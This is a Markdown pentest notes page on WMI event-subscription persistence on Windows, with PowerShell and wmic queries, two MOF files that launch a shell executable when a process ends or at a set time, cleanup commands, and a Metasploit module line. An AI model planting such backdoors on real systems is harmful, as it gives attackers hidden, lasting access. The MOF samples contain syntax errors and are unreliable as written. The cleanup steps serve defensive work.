# WMI

## 01 - Command Prompt

Query information about the namespaces for the WMI functions that will help us to make a persistence mechanism.

- **List the Root namespace**

`C:\> wmic /namespace:\\root path __namespace`

## 02 - Powershell

Query information about the namespaces for the WMI functions that will help us to make a persistence mechanism.

- **List the Root namespace**

```powershell
PS C:\> Get-CimClass

PS C:\> Get-CimClass -Namespace ROOT/CIMV2 | Where-Object CimClassName -like Win32*

PS C:\> Get-WMIObject -namespace "root" -class "__Namespace" | select Name

PS C:\> Get-CimInstance -namespace "root" -class "__Namespace" | Select-Object Name
```

- **List the names for the Subscription**

```powershell
PS C:\> Get-WMIObject -Namespace root\Subscription -list

PS C:\> Get-CimInstance -Namespace root\Subscription -list
```

- **Display the information of the __EventFilter class and it's ability to trigger any `MSFT_SCMEventLogEvent`**

```powershell
PS C:\> Get-WMIObject -Namespace root\Subscription -Class __EventFilter

PS C:\> Get-CimInstance -Namespace root\Subscription -Class __EventFilter
```

- **Same thing with the __EventConsumer that has the `SCM Event Log Consumer` for an event that will happen**

```powershell
PS C:\> gwmi -Namespace "root\Subscription" -Class __EventConsumer

PS C:\> Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding
```

`$ cat terminatecalcapptorunshell.mof`

---

```
#pragma namespace ("\\\\.\root\\subscription)

instance of CommandLineEventConsumer as $Cons {
    Name = "TestConsumer"
    CommandLineTemplate="C:\\path\\to\shell.exe";
};

Instance of __EventFilter as $Filt {
    Name = "TestFilter";
    Query = "Select * From __InstanceDeletionEvent WITHIN 5 "
            "Where TargetInstance ISA \ "Win32_Process\" "
            "AND TargetInstance.Name = \"win32calc.exe\"";
    QueryLanguage = "WQL";
    EventNamespace = "root\\subscription";
};

Instance of __FilterToConsumerBinding {
    Filter = $Filt;
    Consumer = $Cons;
}
```

`C:\> mofcomp terminatecalcapptorunshell.mof`

`$ cat wmitimedevent.mof`

---

```
#pragma namespace ("\\\\.\root\\subscription)  
  
instance of CommandLineEventConsumer as $Cons {  
    Name = "TestConsumer"  
    CommandLineTemplate="C:\\path\\to\shell.exe";  
};  
  
Instance of __EventFilter as $Filt {  
    Name = "TestFilter";  
    Query = "Select * From __InstanceModificationEvent "  
            "Where TargetInstance ISA \ "Win32_LocalTime\" "  
            "AND TargetInstance.Hour = 1 "  
            "AND (TargetInstance.Minute = 24 "  
            "OR TargetInstance.Minute = 25 "  
            "OR TargetInstance.Minute = 26) "  
            "AND TargetInstance.Second = 30 ";  
    QueryLanguage = "WQL";  
    EventNamespace = "root\\cimv2";  
};  
  
Instance of __FilterToConsumerBinding {  
    Filter = $Filt;  
    Consumer = $Cons;  
}
```

`C:\> mofcomp wmitimedevent.mof`

### 2.1 - Clean up the backdoors

Query the namespace for `__EventFilter`

```powershell
PS C:\> Get-WMIObject -namespace root\subscription -class __EventFilter

PS C:\> Get-CimInstance -namespace root\subscription -class __EventFilter
```

Delete the name of the Filter

`C:\> wmic /namespace:"\\root\subscription" path __EventFilter where name="TestFilter" delete`

```powershell
PS C:\> Get-WMIObject -namespace root\subscription -class __EventFilter -Filter "Name='TestFilter'" | Remove-WMIObject -Verbose

PS C:\> Get-CimInstance -namespace root\subscription -class __EventFilter -Filter "Name='TestFilter'" | Remove-WMIObject -Verbose
```

Query to double check if it's deleted

```powershell
PS C:\> Get-WMIObject -namespace root\subscription -class __EventFilter

PS C:\> Get-CimInstance -namespace root\subscription -class __EventFilter
```

Delete the name of the Filter

`C:\> wmic /namespace:"\\root\subscription" path __FilterToConsumerBinding where Filter="__EventFilter.Name='TestConsumer'" delete`

TODO: Convert this to Get-CimInstance

```powershell
PS C:\> Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding -Filter "__Path like 'TestConsumer'" | Remove-WMIObject
```

## 03 - Metasploit

`msf > use exploit/windows/local/wmi_persistence`

## References

- [Pentestlab: Persistence WMI Event Subscription](https://pentestlab.blog/2020/01/21/persistence-wmi-event-subscription/)

- [Cybdefnp: Malware Persistence in WMI](https://cybdefnp.wordpress.com/2020/07/05/malware-persistence-in-wmi/)

- [PDQ: Powershell Guide Get-CimInstance and Get-WMIObject](https://www.pdq.com/blog/powershell-guide-get-ciminstance-and-get-wmiobject/)

- [SS64 Get-CimInstance](https://ss64.com/ps/get-ciminstance.html)